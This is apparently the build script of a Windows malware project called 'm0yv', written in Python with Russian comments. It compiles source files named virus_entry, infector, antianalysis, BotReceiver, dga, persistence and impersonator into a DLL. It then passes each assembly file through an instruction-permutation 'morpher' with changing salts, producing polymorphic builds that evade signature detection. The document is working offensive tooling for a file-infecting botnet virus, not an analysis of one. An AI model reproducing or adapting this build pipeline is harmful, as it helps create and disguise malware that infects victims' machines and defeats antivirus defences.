import subprocess
import os
from shutil import copyfile

print("m0yv core build script with permutator engine")

ignore_names = ["chacha", "add_scalar", "fe", "ge", "sc", "sha512", "verify", "jfes", "key_exchange", "keypair"]

# таргеты для множественно перееба морфером
extensive_target = ["main.cpp", "global.cpp", "utils.cpp", "Filesearch.cpp", "infector.cpp", "preprocessing.cpp", "sectionappender.cpp", "strings.cpp", "flow_disasm.cpp", "codegen.cpp", "EncryptionAlgo.cpp", "antianalysis.cpp", "BotReceiver.cpp", "BotSession.cpp", "dga.cpp", "configreader.cpp", "json_builder.cpp", "NetChannel.cpp", "protoparser.cpp", "operationdispatcher.cpp", "commands.cpp", "evfs.cpp", "modulesystem.cpp", "module_api.cpp", "identifier.cpp", "capsid_tools.cpp", "restorator.cpp", "service.cpp", "access.cpp", "persistence.cpp", "dna.cpp", "trashgen.cpp", "traverser.cpp", "impersonator.cpp", "shares.cpp"]
extensive_repeat = 1

NoExtensive = False

work_dir = "Core"
cppfiles = ["virus_entry.cpp", "DllLoader.cpp", "main.cpp", "global.cpp", "utils.cpp", "infector.cpp", "preprocessing.cpp", "Filesearch.cpp", "sectionappender.cpp", "strings.cpp", "flow_disasm.cpp", "codegen.cpp", "EncryptionAlgo.cpp", "antianalysis.cpp", "BotReceiver.cpp", "BotSession.cpp", "dga.cpp", "configreader.cpp", "json_builder.cpp", "NetChannel.cpp", "protoparser.cpp", "operationdispatcher.cpp", "commands.cpp", "evfs.cpp", "modulesystem.cpp", "module_api.cpp", "identifier.cpp", "capsid_tools.cpp", "restorator.cpp", "service.cpp", "access.cpp", "persistence.cpp", "dna.cpp", "trashgen.cpp", "traverser.cpp", "impersonator.cpp", "shares.cpp"]
cpp_noopt = ["virus_entry.cpp", "DllLoader.cpp", "antianalysis.cpp"]
#cfiles = ["protobuf\\sekhmet_config.pb.c", "protobuf\\sekhmet_info.pb.c", "protobuf\\pb_common.c", "protobuf\\pb_decode.c", "protobuf\\pb_encode.c", "crypto\\chacha.c", "protobuf\\sekhmet_afterenc.pb.c"]
#cfiles = ["hde\hde32.c", "hde\hde64.c"]
cfiles = ["crypto\\chacha.c", "crypto\\ed25519\\add_scalar.c", "crypto\\ed25519\\fe.c", "crypto\\ed25519\\ge.c", "crypto\\ed25519\\sc.c", "crypto\\ed25519\\sha512.c", "crypto\\ed25519\\verify.c", "crypto\\ed25519\\keypair.c", "crypto\\ed25519\\key_exchange.c", "jfes\\jfes.c"]


cppcompile_nooptimize =  "clang++ -S -O3 -fno-jump-tables -mno-sse -fno-builtin -fno-exceptions -D_WINDLL -D_CRT_SECURE_NO_WARNINGS -Wdeprecated-declarations -Wno-macro-redefined -Wno-write-strings -std=c++14 -fno-rtti -target i386-pc-win32"
cppcompile_command = "clang++ -S -O3 -fno-jump-tables -fno-builtin -fno-exceptions -D_WINDLL -D_CRT_SECURE_NO_WARNINGS -Wdeprecated-declarations -Wno-macro-redefined -Wno-write-strings -std=c++14 -fno-rtti -target i386-pc-win32"
ccompile_command = "clang -S -O1 -fno-builtin -D_WINDLL -target i386-pc-win32"

default_salt = "salt"
next_salt = "_t"

permutator_command = "ipython C:\Tools\InstructionMixer\mixasm.py {} {} 2 0 {}"

lastpass_permutator = "ipython C:\Tools\InstructionMixer\mixasm.py {} {} 4 0 {}"
link_command = "clang++ -target i386-pc-win32 {} -llibucrt -luser32 -lkernel32 -ladvapi32 -lshell32 -lgdiplus -lnetapi32 -lgdi32 -lole32 -Xlinker /DEBUG:NONE -Xlinker /subsystem:windows -Xlinker /entry:DllMain -Xlinker /Dll -o Release\\x86.dll"

link_files = [] 

def get_only_name(file):
    obj = file.split('\\')
    obj = obj[len(obj) - 1]
    obj = obj.split('.')
    del obj[-1]

    filef = ""
    for parts in obj:
        filef += (parts + '.')
    return (filef.strip('.'))

def get_s_file(file):
    return (get_only_name(file) + '.s')

def get_output_s_file(file):
    return (get_only_name(file) + '_out.s')

# компилируем плюсовые файлы
print("Compling C++ {} files".format(len(cppfiles)))

for file in cppfiles:
    if (file in cpp_noopt):
        print("No optimize file {}".format(file))
        commandline = "{} {}\\{} ".format(cppcompile_nooptimize, work_dir, file) 
    else:
        commandline = "{} {}\\{} ".format(cppcompile_command, work_dir, file)
    print(commandline)
    subprocess.call(commandline, shell=True)

    link_files.append(file)

# компилируем си файлы
print("Compling C {} files".format(len(cfiles)))

for file in cfiles:
    commandline = "{} {}\\{} ".format(ccompile_command, work_dir, file)
    print(commandline)
    subprocess.call(commandline, shell=True)

    link_files.append(file)

# морфим все
print("\n\nMorphing {} files".format(len(link_files)))


for file in link_files:
    bIgnore = False
    for ign in ignore_names:
        if (get_only_name(file) == ign):
            bIgnore = True
            break
    if (bIgnore):
        print("Blacklisted {}.".format(file))
        continue

    commandline = permutator_command.format(get_s_file(file), get_output_s_file(file), default_salt)
    print(commandline)
    subprocess.call(commandline, shell=True)

print("\n\nMorphing {} extensively in {} passes".format(len(extensive_target), extensive_repeat))
for i in range(0, extensive_repeat):
    if (NoExtensive):
        break

    print("Pass {}".format(i))
    salt = "s_{}_t".format(i)
    for file in extensive_target:
        os.remove(get_s_file(file))
        copyfile(get_output_s_file(file), get_s_file(file))
        if (i + 1 != extensive_repeat):
            commandline = permutator_command.format(get_s_file(file), get_output_s_file(file), salt)
        else:
            commandline = lastpass_permutator.format(get_s_file(file), get_output_s_file(file), salt)
    
        print(commandline)
        subprocess.call(commandline, shell=True)


all_files = ""
for file in link_files:

    bIgnore = False
    for ign in ignore_names:
        if (get_only_name(file) == ign):
            bIgnore = True
    if (bIgnore):
        all_files += (get_s_file(file) + " ")
    else:
        all_files += (get_output_s_file(file) + " ")

commandline = link_command.format(all_files)
print(commandline)
subprocess.call(commandline, shell=True)

# подчистим
for file in link_files:
    print("Deleting {}...".format(get_s_file(file)))
    try:
        os.remove(get_s_file(file))
    except:
        print("")
    try:
        os.remove(get_output_s_file(file))
    except:
        print("")
    try:
        os.remove(get_only_name(file) + '.o')
    except:
        print("")
    try: 
        os.remove(get_only_name(file) + '_out.o')
    except:
        print("")


